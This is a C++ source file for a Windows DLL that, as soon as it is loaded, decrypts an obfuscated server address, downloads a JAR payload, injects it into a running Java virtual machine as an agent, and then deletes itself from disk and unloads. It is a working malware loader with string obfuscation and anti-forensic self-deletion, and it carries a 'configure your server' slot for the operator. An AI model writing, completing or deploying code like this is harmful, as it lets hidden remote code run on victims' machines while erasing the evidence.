// language: C++20, target: Windows 11, MSVC or MinGW-w64

#include <windows.h>
#include "jvm_bridge.h"
#include "downloader.h"
#include "crypt.h"

static HMODULE g_self = nullptr;

// self-delete: queues the DLL file for deletion on next reboot,
// or deletes it immediately if no handle is open
static void self_delete() {
    wchar_t path[MAX_PATH]{};
    if (GetModuleFileNameW(g_self, path, MAX_PATH) == 0) return;

    // try immediate delete after FreeLibrary (file should be unlocked)
    // MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT as fallback
    if (!DeleteFileW(path)) {
        MoveFileExW(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
}

static DWORD WINAPI worker(LPVOID param) {
    Sleep(500 + (GetTickCount() % 300));

    std::vector<uint8_t> payload;

    // ---- CONFIGURE: your server ----
    static constexpr auto enc_host = WENC(L"127.0.0.1");
    static constexpr auto enc_path = WENC(L"/agent.jar");
    auto host = WDEC(enc_host);
    auto path = WDEC(enc_path);
    int port = 8443;

    if (!download_payload(host, path, port, true, payload) || payload.empty()) {
        self_delete();
        FreeLibraryAndExitThread(g_self, 0);
        return 0;
    }

    if (!jvm_load_agent(payload.data(), static_cast<int>(payload.size()))) {
        SecureZeroMemory(payload.data(), payload.size());
        self_delete();
        FreeLibraryAndExitThread(g_self, 0);
        return 0;
    }

    SecureZeroMemory(payload.data(), payload.size());
    payload.clear();

    // delete the DLL file from disk, then unload from memory
    self_delete();
    Sleep(50);
    FreeLibraryAndExitThread(g_self, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        g_self = hModule;
        HANDLE t = CreateThread(nullptr, 0, worker, nullptr, 0, nullptr);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
